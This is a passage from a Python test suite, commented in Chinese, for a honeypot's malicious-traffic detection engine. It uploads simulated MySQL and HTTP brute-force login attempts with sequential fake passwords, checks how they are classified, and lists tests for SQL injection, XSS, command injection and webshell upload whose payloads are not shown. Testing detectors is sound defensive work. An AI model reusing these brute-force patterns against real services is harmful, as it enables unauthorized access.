        assert_log_field(last_detail, 'attack_type', '暴力破解', 'FTP爆破-attack_type')
        assert_log_field(last_detail, 'is_malicious', True, 'FTP爆破-is_malicious')
        print(f"  最后log_id={log_ids[-1]}, attack_type={last_detail.get('attack_type')}")


def test_mysql_brute_force():
    """
    测试21: MySQL高频暴力破解（触发阈值）
    注意: MySQL蜜罐端口可能是3307（从DB动态获取）
    """
    print(f"\n[TEST] MySQL高频暴力破解（{BRUTE_FORCE_THRESHOLD}次）")
    test_ip = "172.16.0.60"

    log_ids = []
    for i in range(BRUTE_FORCE_THRESHOLD):
        log_id = upload_log({
            "honeypot_port": get_port('MYSQL'),
            "attacker_ip": test_ip,
            "attacker_port": 55000 + i,
            "protocol": "TCP",
            "raw_log": f"MySQL AUTH: user=root pass=mysql{i:03d}",
            "payload": f"Username: root, Password: mysql{i:03d}",
        })
        if log_id:
            log_ids.append(log_id)

    time.sleep(0.5)
    if log_ids and len(log_ids) >= BRUTE_FORCE_THRESHOLD:
        last_detail = get_log_detail(log_ids[-1])
        assert last_detail, "获取日志详情失败"
        assert_log_field(last_detail, 'attack_type', '暴力破解', 'MySQL爆破-attack_type')
        assert_log_field(last_detail, 'is_malicious', True, 'MySQL爆破-is_malicious')
        print(f"  最后log_id={log_ids[-1]}, attack_type={last_detail.get('attack_type')}")


def test_mixed_http_get_then_credential():
    """
    测试22: HTTP混合流量 -- 先发大量GET（不计暴力破解），再发少量凭证POST
    验证GET请求不影响暴力破解计数，只有凭证请求才计数。
    """
    print(f"\n[TEST] HTTP混合流量: GET不计数 + 少量凭证POST不触发")
    test_ip = "172.16.0.70"

    # 先发 30 个 GET 请求（不应该触发暴力破解）
    for i in range(30):
        upload_log({
            "honeypot_port": get_port('HTTP'),
            "attacker_ip": test_ip,
            "attacker_port": 56000 + i,
            "protocol": "HTTP",
            "raw_log": f"HTTP REQUEST: GET /api/resource{i} HTTP/1.1",
            "payload": "",
            "request_path": f"/api/resource{i}",
            "user_agent": "Mozilla/5.0",
        })

    time.sleep(0.3)

    # 再发 5 个含凭证的 POST（不应触发暴力破解，凭证计数只有5）
    log_ids = []
    for i in range(5):
        log_id = upload_log({
            "honeypot_port": get_port('HTTP'),
            "attacker_ip": test_ip,
            "attacker_port": 57000 + i,
            "protocol": "HTTP",
            "raw_log": f"HTTP LOGIN: POST /login Username: admin, Password: mix{i:03d}",
            "payload": f"Username: admin, Password: mix{i:03d}",
            "request_path": "/login",
            "user_agent": "python-requests/2.28.0",
        })
        if log_id:
            log_ids.append(log_id)

    time.sleep(0.5)
    if log_ids:
        last_detail = get_log_detail(log_ids[-1])
        assert last_detail, "获取日志详情失败"
        assert_log_field(last_detail, 'attack_type', '正常流量', 'HTTP混合-attack_type')
        assert_log_field(last_detail, 'is_malicious', False, 'HTTP混合-is_malicious')
        print(f"  最后log_id={log_ids[-1]}, attack_type={last_detail.get('attack_type')}")


# ============================================================
# 主执行入口
# ============================================================

def run_all_tests():
    """运行所有测试用例"""
    global _test_passed, _test_failed, _test_errors
    _test_passed = 0
    _test_failed = 0
    _test_errors = []

    print("=" * 70)
    print("  多级恶意流量识别引擎 - 全量自动化测试")
    print(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)

    # 前置检查
    print("\n[SETUP] 检查后端服务是否运行...")
    try:
        resp = requests.get("http://127.0.0.1:5000/", timeout=5)
        print(f"  后端服务: OK (HTTP {resp.status_code})")
    except requests.ConnectionError:
        print("  [FATAL] 后端服务未运行! 请先启动 Flask 后端 (python app.py)")
        sys.exit(1)

    print("\n[SETUP] 登录获取Token...")
    login()
    print(f"  Token: {_auth_token[:20]}...")

    print("\n[SETUP] 检查蜜罐配置...")
    discover_honeypot_ports()

    print("\n[SETUP] 检查/创建Redis规则...")
    ensure_redis_rules()

    print("\n[SETUP] 修正命令注入规则优先级（ID=8，原 priority=5 过高，调低到 18）...")
    fix_command_injection_priority()

    # 运行测试用例
    test_functions = [
        # === 正常流量测试 ===
        test_normal_traffic_ssh,
        test_normal_traffic_ftp,
        test_normal_traffic_http,
        test_normal_traffic_elasticsearch,

        # === 正则规则匹配测试（攻击流量） ===
        test_sql_injection_union,
        test_sql_injection_sleep,
        test_xss_script_tag,
        test_xss_img_onerror,
        test_command_injection,
        test_directory_traversal,
        test_sensitive_file_info_leak,
        test_redis_slaveof,
        test_redis_config_set,
        test_webshell_upload,
        test_scanner_detection,

        # === 暴力破解检测测试 ===
        test_low_frequency_brute_force_ssh,
        test_high_frequency_brute_force_ssh,
        test_http_get_not_brute_force,
        test_http_credential_brute_force,
        test_ftp_brute_force,
        test_mysql_brute_force,

        # === 混合场景测试 ===
        test_mixed_http_get_then_credential,
    ]

    for test_func in test_functions:
        try:
            test_func()
        except AssertionError as e:
            _test_failed += 1
            err = f"  [ERROR] {test_func.__name__}: AssertionError - {str(e)}"
            print(err)
            _test_errors.append(err)
        except Exception as e:
            _test_failed += 1
            err = f"  [ERROR] {test_func.__name__}: {type(e).__name__} - {str(e)}"
            print(err)
            traceback.print_exc()
            _test_errors.append(err)

    # 打印测试结果汇总
    print("\n" + "=" * 70)
    print("  测试结果汇总")
    print("=" * 70)
    total = _test_passed + _test_failed
    print(f"  总断言数: {total}")
    print(f"  通过: {_test_passed}")
    print(f"  失败: {_test_failed}")

    if _test_errors:
        print(f"\n  ---- 失败详情 ----")
        for err in _test_errors:
            print(f"  {err}")

    if _test_failed == 0:
        print(f"\n  [PASS] 全部测试通过! 多级识别引擎工作正常。")
    else:
        print(f"\n  [FAIL] 有 {_test_failed} 个断言失败，请检查识别逻辑。")

    print("=" * 70)
    return 0 if _test_failed == 0 else 1


if __name__ == "__main__":
    exit_code = run_all_tests()
    sys.exit(exit_code)
